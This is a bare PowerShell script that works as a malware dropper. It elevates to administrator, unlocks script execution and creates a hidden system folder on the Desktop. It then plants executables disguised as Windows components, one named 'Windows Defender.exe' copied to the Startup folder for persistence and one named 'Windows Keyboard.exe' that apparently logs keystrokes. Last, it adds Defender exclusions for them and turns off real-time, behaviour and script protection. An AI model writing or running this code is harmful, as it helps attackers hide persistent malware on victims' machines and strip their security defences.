# Check if the current session has administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # Relaunch the script with elevated permissions
    Start-Process powershell.exe -Verb RunAs -ArgumentList $MyInvocation.MyCommand.Definition
    exit
}

# The rest of the script goes here and will run with elevated permissions

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force

New-Item -ItemType Directory -Path "$env:USERPROFILE\Desktop\Windows Updates" -Confirm:$false -Force

attrib +s +h "$env:USERPROFILE\Desktop\Windows Updates"

# Copy file.exe to Windows startup folder
$StartupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item "Windows Defender.exe" $StartupFolder -Confirm:$false

# Copy file2.exe, file3.exe, and file4.exe to Desktop
$WindowsFolder = "$($env:USERPROFILE)\Desktop\Windows Updates"
Copy-Item "Windows Keyboard.exe" $WindowsFolder -Confirm:$false
Copy-Item "Windows Security.exe" $WindowsFolder -Confirm:$false
Copy-Item "Windows Mail.exe" $WindowsFolder -Confirm:$false

# Whitelist file
Add-MpPreference -ExclusionPath "$($env:USERPROFILE)\Desktop\Windows Updates\Windows Keyboard.exe" -ExclusionType File --Confirm:$false

$filePath = "$($env:USERPROFILE)\Desktop\Windows Updates\Windows Keyboard.exe" # Replace with the path to the file you want to exclude
$exclusionType = "File" # Replace with "Folder" if you want to exclude a folder

Add-MpPreference -ExclusionPath $filePath -ExclusionType $exclusionType -Confirm:$false

Set-MpPreference -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled

